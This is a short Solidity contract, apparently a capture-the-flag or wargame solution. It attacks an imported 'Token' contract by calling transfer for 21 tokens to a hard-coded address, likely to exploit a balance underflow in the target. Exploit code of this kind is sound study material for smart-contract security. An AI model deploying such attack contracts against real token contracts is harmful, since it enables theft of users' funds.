pragma solidity ^0.8.11;

import "./Token.sol";

contract TokenAttack {
    Token private _victim;

    constructor(address payable victim) {
        _victim = Token(victim);
    }

    function attack() external returns (uint256) {
        address owner = address(0x5B38Da6a701c568545dCfcB03FcB875f56beddC4);

        _victim.transfer(owner, 21);

        return _victim.balanceOf(owner);
    }
}
